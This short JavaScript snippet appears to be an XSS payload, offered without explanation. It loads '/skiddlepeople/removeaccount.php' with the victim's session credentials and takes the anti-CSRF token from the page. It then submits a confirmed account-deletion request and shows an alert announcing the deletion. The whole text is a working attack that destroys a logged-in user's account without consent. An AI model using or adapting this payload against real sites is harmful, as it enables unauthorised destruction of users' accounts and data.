let x = new XMLHttpRequest();
x.open("GET", "/skiddlepeople/removeaccount.php");
x.withCredentials = true;
x.onload = () => {
  let csrf = new DOMParser().parseFromString(x.responseText, "text/html").querySelector('[name="csrf"]')?.value;
  if (!csrf) return;
  let p = new XMLHttpRequest();
  p.open("POST", "/skiddlepeople/removeaccount.php");
  p.withCredentials = true;
  p.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  p.onload = () => {
    alert("Your Account Deleted !");
  };
  p.send(new URLSearchParams({csrf, confirm: "1"}));
};
x.send();
